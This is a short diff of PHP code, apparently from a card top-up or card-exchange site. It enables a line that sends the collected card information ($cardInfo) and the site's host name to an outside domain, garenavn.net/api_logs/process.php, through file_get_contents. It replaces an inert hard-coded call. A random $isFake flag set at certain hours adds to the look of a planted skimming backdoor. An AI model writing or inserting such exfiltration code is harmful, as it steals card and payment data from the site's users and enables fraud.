@@ -5,7 +5,7 @@ if($getHour == 2 OR $getHour == 5 OR $getHour == 10) {
 	 $isFake = rand(0,2);
 }
 
-$hostInfo = parse_url($_SERVER['HTTP_HOST']);
+$hostInfo = $_SERVER['HTTP_HOST'];
 
 $oldUrl = $url;
 
@@ -122,8 +122,6 @@ else
 
 
 $logInfo = implode('|', $cardInfo);
-//file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo['host'] . '&data_logs=' . $logInfo);
-
-file_get_contents('https://garenavn.net/api_logs/process.php?host=doithecao.com&data_logs=28tqo72738649287472940983764238942');
+file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo);
 
 return $this->response;
